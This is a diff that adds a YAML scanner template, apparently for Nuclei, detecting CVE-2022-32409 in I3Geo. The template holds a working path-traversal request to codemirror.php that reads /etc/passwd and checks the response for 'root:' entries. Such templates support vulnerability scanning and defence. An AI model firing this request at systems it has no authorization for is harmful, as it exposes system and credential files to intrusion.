@@ -1,0 +1,31 @@
+id: CVE-2022-32409
+info:
+  name: I3Geo codemirror.php File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    I3Geo has a file reading vulnerability, allowing attackers to read critical system files, such as database configuration files, causing the website to be in an insecure state.
+  reference:
+    - https://softwarepublico.gov.br/social/i3geo
+  classification:
+    cve-id: CVE-2022-32409
+    cvss-score: 7.6
+
+variables:
+  filepath: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../..{{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - ":0:0"
+        part: body
